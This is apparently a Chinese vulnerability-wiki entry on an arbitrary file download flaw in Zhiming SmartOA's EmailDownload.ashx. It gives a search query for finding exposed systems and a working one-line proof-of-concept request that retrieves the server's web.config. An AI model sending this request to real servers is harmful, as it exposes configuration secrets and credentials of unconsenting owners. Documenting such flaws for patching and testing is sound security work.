---
title: "智明 SmartOA EmailDownload.ashx 任意文件下载漏洞"
date: 2026-10-17 09:12:20
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "智明-SmartOA-EmailDownload.ashx"
tags:
  - "智明-SmartOA-EmailDownload.ashx"
  - "任意文件下载"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

智明 SmartOA EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息

## 漏洞影响

```
智明 SmartOA
```

## 网络测绘

```
app="智明协同-SmartOA"
```

## 漏洞复现

登录页面

![image-20220520133519986](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201335202.png)

验证POC

```
/file/EmailDownload.ashx?url=~/web.config&name=web.config
```

![image-20220520133538762](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201335862.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%99%BA%E6%98%8E-SmartOA-EmailDownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
